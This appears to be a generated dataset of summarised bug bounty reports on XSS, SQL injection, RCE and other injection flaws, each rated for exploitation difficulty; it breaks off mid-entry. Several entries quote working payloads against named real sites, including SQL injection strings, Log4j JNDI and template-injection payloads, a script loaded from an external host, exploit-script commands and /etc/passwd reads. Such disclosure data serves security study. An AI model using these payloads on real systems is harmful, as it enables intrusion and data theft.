+1. Run GitLab Docker container: `docker run --detach --hostname gitlab.example.com --publish 443:443 --publish 80:80 --publish 22:22 --name gitlab gitlab/gitlab-ce:latest`
+2. Create a new project with README.md, go to Operations -> Kubernetes, click 'Add Kubernetes cluster', select 'Add existing cluster' tab, and fill in the fields with malicious input (e.g., XSS payload in Kubernetes cluster name, API URL, or Service Token).
+Exploitation Difficulty:
+The vulnerability involves a straightforward injection of malicious scripts into input fields, which is a common and well-documented attack vector. The steps to reproduce are simple and do not require deep understanding of complex application states or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 81: Cross-Site Scripting (XSS) on www.starbucks.com | .co.uk login pages
+================================================================================
+Vulnerability Description:
+The login page of Starbucks websites (e.g., www.starbucks.com) is vulnerable to Cross-Site Scripting (XSS) due to improper escaping of the URL path. An attacker can inject malicious JavaScript via the URL path, which executes when a user interacts with certain elements (e.g., hovering over the 'Find the Store' button). This can be exploited to steal user credentials or perform other malicious actions.
+
+Steps to Reproduce:
+1. Open Chrome or Firefox and visit the vulnerable URL: https://www.starbucks.com/account/(A(%22%20%252fonmouseover=%22alert%25%32%38%64%6f%63%75%6d%65%6e%74.%64%6f%6d%61%69%6e%25%32%39%22))/signin
+2. Move the mouse over the 'Find the Store' button in the upper right-hand corner to trigger the XSS payload (an alert showing document.domain).
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common XSS flaw (improper input sanitization) and does not require complex interactions or state manipulation. The attack vector (URL path) is easily accessible, and the payload execution is triggered by a simple user action (mouse hover).
+
+--------------------------------------------------------------------------------
+
+Report 82: Stored XSS at ██████userprofile.aspx
+================================================================================
+Vulnerability Description:
+Stored XSS vulnerability exists at ██████████userprofile.aspx under 'say something about yourself...'. XSS can be used for a variety of attacks, including stealing cookies, passwords, or running arbitrary code in the victim's browser.
+
+Steps to Reproduce:
+1. Create an account at ███████
+2. Go to your profile at ████userprofile.aspx
+3. Go to 'Say something about yourself...' and enter the XSS payload xxx<svg/onload=alert(document.cookie);>xxx
+4. Observe that XSS triggers and reload the page to observe that it is stored XSS.
+Exploitation Difficulty:
+The attack involves a straightforward injection of a script into a form field, which is a common and well-documented vulnerability. There are no complex interactions or states involved, and the payload is a standard XSS test.
+
+--------------------------------------------------------------------------------
+
+Report 83: Blind Stored XSS Via Staff Name
+================================================================================
+Vulnerability Description:
+Blind stored XSS vulnerability in the staff name field of Shopify's admin settings, allowing execution of arbitrary JavaScript when the payload is rendered in the internal web interface.
+
+Steps to Reproduce:
+1. Go to https://your-store.myshopify.com/admin/settings/account
+2. Add Staff Account and fill First & Last Name with payload: "><script>$.getScript("//█████████.xss.ht")</script>"
+Exploitation Difficulty:
+The vulnerability involves a straightforward XSS payload injection into a user-controllable field (staff name) with no complex interactions or state manipulation required. The attack surface is obvious (user input fields) and the payload is a standard XSS vector.
+
+--------------------------------------------------------------------------------
+
+Report 84: Stored XSS on https://app.crowdsignal.com/surveys/[Survey-Id]/question - Bypass
+================================================================================
+Vulnerability Description:
+A stored XSS vulnerability exists in the media embedding feature of Crowdsignal surveys. By embedding a manipulated media payload, an attacker can execute arbitrary JavaScript in the context of the survey page, potentially stealing cookies or performing other malicious actions.
+
+Steps to Reproduce:
+1. Go to https://app.crowdsignal.com/dashboard and create a survey.
+2. Navigate to https://app.crowdsignal.com/quizzes/{survey-id}/question and add a Multiple Choice question.
+3. Click the 'Add media' button and select 'Embed Media'.
+4. Paste the initial payload: [dailymotion id=x8oma9] and insert it.
+5. Open Burp Suite, click 'Save', and intercept the request.
+6. Modify the 'media[11111111]' parameter in the intercepted request to include the XSS payload: [dailymotion id=x8oma9"><svg/onload=prompt(document.domain)>].
+7. Forward the request and refresh the page to see the XSS alert.
+Exploitation Difficulty:
+The vulnerability involves multiple steps including survey creation, media embedding, and request manipulation. However, the steps are straightforward and the XSS payload is a common pattern. The interaction between the media embedding and the parameter manipulation is not particularly subtle or complex.
+
+--------------------------------------------------------------------------------
+
+Report 85: Reflected XSS on a Atavist theme at external_import.php
+================================================================================
+Vulnerability Description:
+Reflected XSS vulnerability in the 'scripts' parameter of external_import.php file, which allows arbitrary JavaScript execution due to lack of output encoding. The vulnerability can lead to account takeover via cookie stealing since the session cookie lacks secure flag.
+
+Steps to Reproduce:
+1. Identify the vulnerable endpoint: https://magazine.atavist.com/static/external_import.php
+2. Inject malicious script via the 'scripts' parameter: https://magazine.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a simple parameter manipulation with no complex interactions or state manipulations required. The attack vector is a common XSS pattern with no novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 86: Stored-XSS in merge requests
+================================================================================
+Vulnerability Description:
+A stored XSS vulnerability exists in the merge requests pages where the source_branch parameter is not sanitized when used as a title attribute, allowing an attacker to execute arbitrary JavaScript code in the context of the victim's session.
+
+Steps to Reproduce:
+1. Create a new project with the option 'Initialize repository with a README' or use an existing project.
+2. Create a new branch with a name containing an XSS payload, e.g., '><iframe/srcdoc='<script/src=/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>'.
+3. Create a new merge request from the new branch to master.
+4. Open the merge request to trigger the XSS payload.
+Exploitation Difficulty:
+The vulnerability involves a straightforward injection of an XSS payload into a branch name, which is then reflected in the merge request page without proper sanitization. The attack does not require complex interactions or deep understanding of the application's state.
+
+--------------------------------------------------------------------------------
+
+
+
+Weaknesses.OTHER_INJECTION Vulnerabilities (75 reports)
+--------------------------------------------------
+
+Report 1: [SQLI ]Time Bassed Injection at ██████████ via /██████/library.php?c=G14 parameter
+================================================================================
+Vulnerability Description:
+This is a time-based SQL injection vulnerability in the 'c' parameter of the /library.php endpoint. The attacker can inject malicious SQL queries that cause the database to delay its response, confirming the vulnerability based on the response time.
+
+Steps to Reproduce:
+1. Copy the request to your Burp Suite: GET /█████████/library.php?c=G14'XOR(if(now()=sysdate(),sleep(1*1),0))OR' HTTP/1.1
+2. Observe the response time to confirm the time-based SQL injection (e.g., 2,077 millis for sleep(1*1), 4,599 millis for sleep(2*2))
+Exploitation Difficulty:
+The attack involves a straightforward injection of a time-delay payload into a single parameter. The interaction is direct and does not require complex state manipulation or novel logic. The payload is a common pattern for time-based SQL injection.
+
+--------------------------------------------------------------------------------
+
+Report 2: [intensedebate.com] SQL Injection Time Based on /changeReplaceOpt.php
+================================================================================
+Vulnerability Description:
+The vulnerability is a time-based SQL injection in the 'acctid' parameter of the changeReplaceOpt.php endpoint on intensedebate.com. By injecting a SLEEP function, an attacker can manipulate the database query to delay the response, confirming the injection and potentially gaining access to the database.
+
+Steps to Reproduce:
+1. Send a GET request to https://www.intensedebate.com/changeReplaceOpt.php with the parameter 'acctid' containing a SQL injection payload that includes the SLEEP function (e.g., acctid=419523 AND SLEEP(15)).
+2. Observe the response time to confirm the SQL injection (e.g., if the response time matches the SLEEP duration, the injection is successful).
+Exploitation Difficulty:
+The attack involves a straightforward SQL injection using the SLEEP function, which is a common technique for time-based SQL injections. It does not require multiple components, complex application states, or novel logic. The interaction is direct and obvious once the vulnerable parameter is identified.
+
+--------------------------------------------------------------------------------
+
+Report 3: [CVE-2018-7600] Remote Code Execution due to outdated Drupal server on www.█████████
+================================================================================
+Vulnerability Description:
+Due to an outdated Drupal version (7.54), remote code execution is possible via CVE-2018-7600. This vulnerability allows attackers to execute arbitrary code on the server due to an issue affecting multiple subsystems with default or common module configurations.
+
+Steps to Reproduce:
+1. Download the exploit from the git repository: git clone https://github.com/dreadlocked/Drupalgeddon2.git && cd Drupalgeddon2
+2. Run the exploit with the command: ruby drupalgeddon2-customizable-beta.rb -u https://www.████████/ -v 7 -c id --form user/login
+Exploitation Difficulty:
+The attack involves using a publicly available exploit script against a known vulnerability in an outdated Drupal version. The steps are straightforward and do not require complex interactions or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 4: RCE in ██████ subdomain via CVE-2017-1000486
+================================================================================
+Vulnerability Description:
+The application uses a vulnerable version of primefaces (5.3, not 5.3.8), which is susceptible to unauthenticated remote code execution (RCE) via CVE-2017-1000486. An attacker can execute arbitrary commands on the server as the tomcat user.
+
+Steps to Reproduce:
+1. Get the publicly available POC for this vulnerability from https://github.com/pimps/CVE-2017-1000486
+2. Execute the POC with the command: python primefaces.py ███/ftn-Website/ -c id
+Exploitation Difficulty:
+The vulnerability is straightforward to exploit using a publicly available proof-of-concept (POC) script. The attack does not involve multiple components, complex interactions, or novel logic. It simply requires running the POC against the vulnerable endpoint.
+
+--------------------------------------------------------------------------------
+
+Report 5: 2x Remote file inclusion within your VMware Instances
+================================================================================
+Vulnerability Description:
+This is a remote file inclusion vulnerability that allows an attacker to view sensitive files on the server, such as /etc/passwd, by manipulating the 'id' parameter in the URL. This could potentially lead to further exploitation, such as remote code execution.
+
+Steps to Reproduce:
+1. Navigate to the URL: https://nmc.vc.mtn.co.ug/eam/vib?id=/etc/passwd
+2. Observe that the contents of /etc/passwd are displayed in the response
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a simple manipulation of a URL parameter to access sensitive files. There are no complex interactions or states involved, and the attack logic is commonly seen in other applications.
+
+--------------------------------------------------------------------------------
+
+Report 6: Blind SQL Injection 
+================================================================================
+Vulnerability Description:
+The vulnerability is a Blind SQL Injection in the login form of the website. The attacker can manipulate the phone_number parameter to execute arbitrary SQL commands, potentially bypassing authentication, retrieving database contents, or modifying data.
+
+Steps to Reproduce:
+1. Send a POST request to https://futexpert.mtngbissau.com/signin/ with the following parameters: phone_number=0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z&pin=1&submit=Continuar
+2. Observe the response time or behavior to confirm if the sleep function was executed, indicating a successful Blind SQL Injection
+Exploitation Difficulty:
+The attack involves a straightforward SQL injection payload targeting a single parameter. While it requires knowledge of SQL injection techniques, the payload is not complex and does not involve multiple components or subtle interactions.
+
+--------------------------------------------------------------------------------
+
+Report 7: RCE Apache Struts2 remote command execution (S2-045) on [wifi-partner.mtn.com.gh]
+================================================================================
+Vulnerability Description:
+A Remote Code Execution (RCE) vulnerability exists in Apache Struts2 when using the Jakarta Multipart parser for file uploads. By manipulating the Content-Type header with malicious OGNL expressions, an attacker can execute arbitrary commands on the server.
+
+Steps to Reproduce:
+1. Send a crafted HTTP GET request to the vulnerable endpoint with a malicious Content-Type header containing OGNL (Object-Graph Navigation Language) expressions.
+2. The crafted Content-Type header triggers the vulnerability, allowing the execution of arbitrary commands (in this case, printing the result of 31337*31337).
+Exploitation Difficulty:
+The attack involves a single, well-documented exploit (S2-045) with a straightforward payload. The complexity is low because it does not require multiple components, subtle interactions, complex state manipulation, or novel logic. The exploit is widely known and documented.
+
+--------------------------------------------------------------------------------
+
+Report 8: Unauth RCE on Jenkins Instance at https://█████████/
+================================================================================
+Vulnerability Description:
+Unauthenticated Remote Code Execution (RCE) vulnerability in a Jenkins instance, allowing attackers to execute arbitrary commands without authentication.
+
+Steps to Reproduce:
+1. Navigate to the vulnerable Jenkins instance at https://███████/_script
+2. Execute the following commands to confirm RCE: println "ls".execute().text and println "whoami".execute().text
+Exploitation Difficulty:
+The vulnerability involves a straightforward exploitation of a script console endpoint in Jenkins that is accessible without authentication. The attack does not require multiple components, complex state manipulation, or novel logic. The steps to reproduce are simple and do not involve subtle interactions between components.
+
+--------------------------------------------------------------------------------
+
+Report 9: SQL Injection on https://soa-accp.glbx.tva.gov/ via "/api/" path - VI-21-015
+================================================================================
+Vulnerability Description:
+The subdomain soa-accp.glbx.tva.gov is vulnerable to SQL injection through the /api/ path. An attacker can manipulate SQL statements sent to the Microsoft SQL Server database, allowing them to extract sensitive information such as hostnames and database versions, or execute arbitrary SQL commands.
+
+Steps to Reproduce:
+1. Access the vulnerable endpoint: https://soa-accp.glbx.tva.gov/api/river/observed-data/GVDA1'
+2. Append SQL injection payload: '+%2f*!50000union*%2f+SELECT+HOST_NAME()--+- to dump the hostname
+3. Alternatively, use time-based SQL injection: '+WAITFOR+DELAY+'0:0:10'--+- to confirm vulnerability
+Exploitation Difficulty:
+The vulnerability involves a straightforward SQL injection attack with common techniques like UNION-based and time-based injections. The attack does not require complex application state manipulation or understanding of novel logic. The components involved are standard for SQL injection vulnerabilities.
+
+--------------------------------------------------------------------------------
+
+Report 10: [informatica.com] Blind SQL Injection
+================================================================================
+Vulnerability Description:
+The 'docId' parameter in the JSON POST request is vulnerable to Blind SQL Injection, allowing an attacker to extract database information by manipulating boolean conditions in the SQL query.
+
+Steps to Reproduce:
+1. Send a POST request to '/_vti_bin/RatingsCalculator/RatingsCalculator.asmx/CalculateRatings' with a JSON payload containing a 'docId' parameter.
+2. Manipulate the 'docId' parameter with SQL injection payloads to extract database information through boolean-based blind SQL injection.
+Exploitation Difficulty:
+The attack involves a straightforward manipulation of a single parameter in a POST request to perform boolean-based blind SQL injection. The complexity is low as it does not require understanding of multiple components, complex application states, or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 11: RCE on ███████ [CVE-2021-26084]
+================================================================================
+Vulnerability Description:
+An OGNL injection vulnerability in Confluence Server and Data Center allows authenticated or unauthenticated users (if signup is enabled) to execute arbitrary code via crafted requests to vulnerable endpoints.
+
+Steps to Reproduce:
+1. Send a POST request to the vulnerable endpoint /pages/createpage-entervariables.action?SpaceKey=x with a crafted queryString parameter containing OGNL injection payload.
+2. The payload executes arbitrary code (e.g., cat /etc/passwd) on the server, and the response includes the command output.
+Exploitation Difficulty:
+The attack involves crafting a complex OGNL injection payload and understanding the vulnerable endpoint. While the payload is intricate, the vulnerability itself is a known OGNL injection pattern, and the endpoint is straightforward to target once identified.
+
+--------------------------------------------------------------------------------
+
+Report 12: CVE-2021-40870 on [52.204.160.31]
+================================================================================
+Vulnerability Description:
+An unrestricted file upload vulnerability in Aviatrix Controller 6.x allows unauthenticated attackers to upload arbitrary files (including PHP scripts) via directory traversal, leading to remote code execution.
+
+Steps to Reproduce:
+1. Send a POST request to /v1/backend1 with a crafted payload that includes directory traversal in the account_name parameter to upload a PHP file containing arbitrary code.
+2. Retrieve the uploaded PHP file via a GET request to execute the arbitrary code and confirm RCE by observing the phpinfo() output.
+Exploitation Difficulty:
+The vulnerability involves a straightforward exploitation of an unrestricted file upload flaw combined with directory traversal, which are well-known attack vectors. The steps to reproduce are simple and do not require complex interactions or state manipulation.
+
+--------------------------------------------------------------------------------
+
+Report 13: Remote code injection in Log4j on http://mtn1app.mtncameroon.net  - CVE-2021-44228
+================================================================================
+Vulnerability Description:
+This is a remote code injection vulnerability in Log4j (CVE-2021-44228) affecting the specified MTN Cameroon application. The vulnerability allows for remote command execution via a crafted JNDI lookup, as demonstrated by retrieving the hostname of the machine.
+
+Steps to Reproduce:
+1. Run the nuclei script targeting the vulnerable URL: ./nuclei -u http://mtn1app.mtncameroon.net:8080/ -t ../nuclei-templates/cves/2021/CVE-2021-44228.yaml
+2. Observe the output which includes the hostname of the machine, confirming the vulnerability.
+Exploitation Difficulty:
+The vulnerability was discovered using a publicly available nuclei script, which automates the detection of this well-known Log4j vulnerability. The attack involves a straightforward injection without requiring complex interactions or state manipulation.
+
+--------------------------------------------------------------------------------
+
+Report 14: CVE-2022-24288: Apache Airflow: TWO RCEs in example DAGs
+================================================================================
+Vulnerability Description:
+The vulnerability involves command injection in Apache Airflow's example DAGs (example_passing_params_via_test_command.py and tutorial.py) due to insufficient sanitization of user-supplied parameters in Jinja2 templates. Attackers can exploit this to execute arbitrary commands on the system, especially when Airflow is configured for unauthenticated access.
+
+Steps to Reproduce:
+1. Navigate to the DAGs menu in Apache Airflow and select 'example_passing_params_via_test_command' task.
+2. Trigger the DAG with a custom configuration that includes malicious parameters (e.g., 'Foo' or 'MIFF') to execute arbitrary commands.
+3. Navigate to the DAGs menu and select 'tutorial' task.
+4. Trigger the DAG with a custom configuration that includes a malicious parameter (e.g., 'my_param') to execute arbitrary commands.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves common command injection patterns in templated parameters. The attack does not require complex interactions or state manipulation, and the exploitation steps are direct and well-documented in the context of web applications and template engines.
+
+--------------------------------------------------------------------------------
+
+Report 15: ██████████ vulnerable to CVE-2022-22954
+================================================================================
+Vulnerability Description:
+CVE-2022-22954 is a server-side template injection vulnerability in VMware Workspace ONE Access and Identity Manager, allowing unauthenticated remote code execution. An attacker can exploit this by sending a specially crafted request to a vulnerable instance, potentially gaining full control of the server.
+
+Steps to Reproduce:
+1. Visit the vulnerable URL and intercept the request using a tool like Burp Suite
+2. Append the crafted endpoint '/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d' to the request and analyze the response
+Exploitation Difficulty:
+The vulnerability involves a straightforward injection attack with a known payload. The complexity is low because the attack does not require multiple components, complex state manipulation, or novel logic. The payload is publicly documented for this specific CVE.
+
+--------------------------------------------------------------------------------
+
+Report 16: ███ vulnerable to CVE-2022-22954
+================================================================================
+Vulnerability Description:
+CVE-2022-22954 is a server-side template injection vulnerability in VMware Workspace ONE Access and Identity Manager, allowing unauthenticated remote code execution via a crafted HTTP request.
+
+Steps to Reproduce:
+1. Identify a target system running VMware Workspace ONE Access or Identity Manager.
+2. Send a specially crafted HTTP GET request with a server-side template injection payload to the vulnerable URL.
+3. Observe the response for evidence of remote code execution, such as the contents of '/etc/passwd' being returned.
+Exploitation Difficulty:
+The attack involves a single, straightforward step of sending a crafted request to a known vulnerable endpoint. The payload is a standard template injection, and the interaction is direct with no need for complex state manipulation or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 17: [███████] Remote Code Execution at ██████ [CVE-2021-44529] [HtUS]
+================================================================================
+Vulnerability Description:
+A code injection vulnerability in the Ivanti EPM Cloud Services Appliance (CSA) allows an unauthenticated user to execute arbitrary code with limited permissions (nobody).
+
+Steps to Reproduce:
+1. Identify the vulnerable server running Ivanti EPM Cloud Services Appliance (CSA).
+2. Use Burp Repeater to send a GET request to the vulnerable endpoint with a Base64 encoded system command (e.g., 'cGhwaW5mbygpOw==' for phpinfo).
+Exploitation Difficulty:
+The vulnerability involves a straightforward injection of Base64 encoded commands via a GET request, without requiring complex interactions or state manipulation.
+
+--------------------------------------------------------------------------------
+
+Report 18: SQL injection at [█████████] [HtUS]
+================================================================================
+Vulnerability Description:
+The endpoint /olc/set/m101/leasib.php is vulnerable to SQL injection via the 'scn' parameter, allowing an attacker to execute arbitrary SQL queries and potentially gain access to the database.
+
+Steps to Reproduce:
+1. Identify the vulnerable endpoint at /olc/set/m101/leasib.php on the target system.
+2. Use sqlmap with the provided command to exploit the SQL injection vulnerability in the 'scn' parameter: `python3 sqlmap.py --level=5 --risk=3 --tamper=space2comment --random-agent -u https://████/olc/set/m101/leasib.php --data="COURSEID=M101&SUBJECT=Entry%20Briefing&StudentName=dPbRKJwr&Submit=Submit%20Confirmation&scn=0" -p scn`
+3. Optionally, use the `--dbs` flag with sqlmap to enumerate available databases.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover using automated tools like sqlmap, and does not involve complex interactions or novel logic. The attack primarily involves identifying the vulnerable parameter and using standard SQL injection techniques.
+
+--------------------------------------------------------------------------------
+
+Report 19: SQL injection at [https://█████████] [HtUS]
+================================================================================
+Vulnerability Description:
+The endpoint at /olc/███comments/comment_post.php is vulnerable to SQL injection via the 'staff_student' parameter. This allows an attacker to execute arbitrary SQL queries, potentially leading to unauthorized database access.
+
+Steps to Reproduce:
+1. Identify the vulnerable endpoint at /olc/███comments/comment_post.php
+2. Use sqlmap with the provided command to test the 'staff_student' parameter for SQL injection vulnerabilities
+Exploitation Difficulty:
+The vulnerability was discovered using automated tools (sqlmap) with standard parameters, indicating a straightforward discovery process. The attack does not involve complex interactions or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 20: solr_log4j - http://██████████
+================================================================================
+Vulnerability Description:
+The vulnerability is a Log4j Remote Code Execution (RCE) issue in the Solr application. By logging untrusted or user-controlled data with a vulnerable version of Log4J, an attacker can execute arbitrary code remotely. This includes exploiting logged errors, exception traces, or authentication failures where user input is included.
+
+Steps to Reproduce:
+1. Identify the Solr admin endpoint: http://████████/solr/admin/collections
+2. Send a GET request to the endpoint with a crafted JNDI payload: http://████████/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.YOURINTERACTSERVER/a%7D
+Exploitation Difficulty:
+The attack involves a straightforward exploitation of a well-known vulnerability (Log4j RCE) using a simple JNDI payload. The steps are minimal and do not require complex interactions or state manipulation. The vulnerability is widely documented, making it easier to discover and exploit.
+
+--------------------------------------------------------------------------------
+
+Report 21: CVE-2022-38362: Apache Airflow Docker Provider <3.0 RCE vulnerability in example dag
+================================================================================
+Vulnerability Description:
+The vulnerability is a command injection in an example DAG script provided by Apache Airflow's Docker provider. The script uses a user-controlled parameter ('source_location') in a Bash command without proper sanitization, allowing authenticated users to execute arbitrary commands on the Airflow worker host.
+
+Steps to Reproduce:
+1. Access the Apache Airflow web interface and navigate to the DAGs menu.
+2. Trigger the 'docker_sample_copy_data' task with a crafted payload in the 'source_location' parameter, e.g., {"source_location":";touch /tmp/thisistest;"}.
+Exploitation Difficulty:
+The vulnerability involves understanding the interaction between user input and command execution in a specific example DAG. While the attack requires authenticated access, the injection itself is straightforward once the vulnerable parameter is identified.
+
+--------------------------------------------------------------------------------
+
+Report 22: CVE-2022-40127: RCE in Apache Airflow <2.4.0 bash example
+================================================================================
+Vulnerability Description:
+The vulnerability is a command injection flaw in Apache Airflow's example_bash_operator.py, where the 'run_id' parameter is not properly sanitized before being used in a bash command. This allows an attacker to inject and execute arbitrary OS commands.
+
+Steps to Reproduce:
+1. Navigate to the DAGs menu in Apache Airflow and select the 'example_bash_operator' task.
+2. Select 'Trigger DAG w/ config' and set the 'run_id' parameter to a malicious command, e.g., 'touch /tmp/success'.
+3. Trigger the DAG to execute the injected command.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a direct command injection in a visible parameter ('run_id') without any complex interactions or state manipulations. The attack path is linear and does not require understanding of multiple components or subtle interactions.
+
+--------------------------------------------------------------------------------
+
+Report 23: DMARC  Not found for paragonie.com   URGENT
+================================================================================
+Vulnerability Description:
+The domain paragonie.com does not have a DMARC (Domain-based Message Authentication, Reporting, and Conformance) record configured. DMARC is an email authentication protocol that helps prevent email spoofing and phishing by allowing domain owners to specify how email receivers should handle emails that fail SPF (Sender Policy Framework) or DKIM (DomainKeys Identified Mail) checks. The absence of a DMARC record makes the domain vulnerable to email spoofing attacks, where attackers can send emails that appear to originate from paragonie.com without proper authentication.
+
+Steps to Reproduce:
+1. Check the DNS records for paragonie.com using tools like dig, nslookup, or online DNS lookup services.
+2. Verify the absence of a DMARC (TXT) record for the domain paragonie.com.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it only requires checking the DNS records of the domain for the presence of a DMARC TXT record. The process involves using common DNS lookup tools and does not require any complex interactions or manipulation of application states.
+
+--------------------------------------------------------------------------------
+
+Report 24: Sending arbitrary IPC messages via overriding Array.prototype.push
+================================================================================
+Vulnerability Description:
+This vulnerability allows an attacker to execute arbitrary IPC messages by overriding the Array.prototype.push method. When the method is overridden, it can be used to send malicious messages that change browser settings, such as the homepage, leading to potential UXSS and address bar spoofing.
+
+Steps to Reproduce:
+1. Navigate to the vulnerable page: https://vulnerabledoma.in/brave/settings_change3.html
+2. Execute the provided script to override Array.prototype.push, which triggers the vulnerability when the embed element is loaded
+3. Check about:preferences to confirm the homepage has been changed to http://attacker.example.com/
+Exploitation Difficulty:
+The attack requires understanding and manipulating JavaScript's prototype inheritance and the specific way the Brave browser handles IPC messages. The interaction between the overridden push method and the browser's internal event handling is subtle and non-obvious.
+
+--------------------------------------------------------------------------------
+
+Report 25: Time-based Blind SQLi on news.starbucks.com
+================================================================================
+Vulnerability Description:
+The vulnerability is a time-based blind SQL injection in the 'group_id' parameter of a POST request to news.starbucks.com. The lack of proper input sanitization allows an attacker to inject SQL commands that can conditionally delay the server's response, enabling information disclosure about the database.
+
+Steps to Reproduce:
+1. Send a crafted HTTP POST request to news.starbucks.com with the 'group_id' parameter containing a SQL injection payload that includes a conditional SLEEP command.
+2. Observe the response time to determine if the injection was successful (delayed response indicates successful injection).
+Exploitation Difficulty:
+The attack involves a straightforward SQL injection technique with a time-based component. While it requires knowledge of SQL injection and the use of time delays, the attack does not involve multiple components, complex application states, or novel logic. The interaction between the components is direct and well-understood in the security community.
+
+--------------------------------------------------------------------------------
+
+Report 26: Blind SQL injection on id.indrive.com
+================================================================================
+Vulnerability Description:
+The server does not sanitize user input, allowing SQL injection. Attackers can inject arbitrary SQL commands, demonstrated by retrieving database entries and confirming with conditional logic (1=1 vs 1=2).
+
+Steps to Reproduce:
+1. Go to https://promo.indrive.com/10ridestogetprize_ru/random
+2. Click "Сгенерировать" and observe the request to https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/29/5/phone
+3. Repeat the request, modifying the path to inject SQL: /api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--
+4. Observe the response containing a random database entry
+5. Modify the path to /api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--
+6. Observe the empty response confirming SQL injection vulnerability
+Exploitation Difficulty:
+The vulnerability is straightforward to discover using basic SQL injection techniques. The attack involves simple parameter manipulation without complex interactions or state manipulation.
+
+--------------------------------------------------------------------------------
+
+Report 27: Time based SQL injection at████████
+================================================================================
+Vulnerability Description:
+The endpoint /pubs/index.php is vulnerable to time-based SQL injection via the 'years' and 'authors' parameters. This allows an attacker to exfiltrate sensitive data from the database by manipulating the response time of the server.
+
+Steps to Reproduce:
+1. Send a POST request to /pubs/index.php with the 'years' parameter set to a valid year (e.g., 2017) and the 'authors' parameter containing a time-based SQL injection payload like: Hurlburt'XOR(if(now()=sysdate(),sleep(2*2),0))OR'
+2. Observe the response time. A delayed response (e.g., 4 seconds for sleep(2*2)) confirms the time-based SQL injection vulnerability.
+Exploitation Difficulty:
+The vulnerability involves a straightforward injection of a time-delay payload into a parameter, which is a common and well-documented attack vector. The discovery does not require complex interactions or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 28: SQL injection in URL path leads to Database Access
+================================================================================
+Vulnerability Description:
+The application is vulnerable to SQL injection via URL path parameters. The ID numbers in the URL are directly inserted into backend SQL queries without proper sanitization, allowing an attacker to manipulate the queries and potentially access the database.
+
+Steps to Reproduce:
+1. Navigate to the URL: https://corporate.admyntec.co.za/customerInsurance/newCustomerStep8/userId/868878/customerId/732562/contactPersonId/0
+2. Modify the URL by adding a single quote after the customerId number: https://corporate.admyntec.co.za/customerInsurance/newCustomerStep8/userId/868878/customerId/732562'/contactPersonId/0
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a simple manipulation of URL parameters, a common technique for testing SQL injection vulnerabilities. The attack does not require understanding complex application states or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 29: Exploitable Format String Vulnerability in curl_mfprintf Function
+================================================================================
+Vulnerability Description:
+The curl_mfprintf function in the curl_printf.h file contains a format string vulnerability that allows an attacker to inject arbitrary format specifiers. This can lead to unauthorized access to memory content, potential application crashes, or leakage of sensitive data.
+
+Steps to Reproduce:
+1. Prepare the Test Code: Create a new file named test_printf.c with the specified content
+2. Compile the Code: Compile the test program with the given command
+3. Execute the Code: Run the compiled program
+4. Observe the Output: The output displays memory content, confirming the vulnerability
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a well-known format string vulnerability pattern. The attack does not require multiple components, complex application states, or novel logic. The interaction is obvious and commonly found in other applications.
+
+--------------------------------------------------------------------------------
+
+Report 30: CVE-2024-53908: Django Potential SQL injection in `HasKey(lhs, rhs)` on Oracle
+================================================================================
+Vulnerability Description:
+The vulnerability is a potential SQL injection in Django's `HasKey(lhs, rhs)` lookup when used on Oracle databases. Direct usage of this lookup with untrusted data as the `lhs` value can lead to SQL injection, allowing attackers to execute arbitrary SQL commands, potentially leading to unauthorized access, data manipulation, or information disclosure.
+
+Steps to Reproduce:
+1. Identify a Django application using the `HasKey(lhs, rhs)` lookup on an Oracle database.
+2. Inject untrusted data into the `lhs` parameter of the `HasKey` lookup to execute arbitrary SQL commands.
+Exploitation Difficulty:
+The vulnerability requires specific knowledge of Django's ORM and the `HasKey` lookup, as well as understanding of Oracle database quirks. However, the attack vector is straightforward once these components are known, and the interaction between them is not overly complex or subtle.
+
+--------------------------------------------------------------------------------
+
+Report 31: SQL injection on █████ due to tech.cfm 
+================================================================================
+Vulnerability Description:
+The website is vulnerable to SQL injection via the Sort parameter in the tech.cfm page. An attacker can manipulate the SQL query by injecting malicious input, leading to potential unauthorized database access or data exfiltration.
+
+Steps to Reproduce:
+1. Navigate to the vulnerable URL: https://█████/hro/html/tech.cfm?Sort=Grade&ThisType=2
+2. Inject a single quote (') into the Sort parameter to induce an SQL error and reveal the SQL query
+3. Confirm vulnerability by using a time-based query like SLEEP(25) in the Sort parameter: https://███/hro/html/tech.cfm?Sort=SLEEP(25)&ThisType=3
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a basic SQL injection technique (single quote injection) and the error message directly reveals the SQL query structure. The attack does not require complex interactions or state manipulation.
+
+--------------------------------------------------------------------------------
+
+Report 32: [query-mysql] SQL Injection due to lack of user input sanitization allows to run arbitrary SQL queries when fetching data from database
+================================================================================
+Vulnerability Description:
+SQL Injection vulnerability in query-mysql module due to lack of user input sanitization, allowing attackers to execute arbitrary SQL queries by manipulating input parameters.
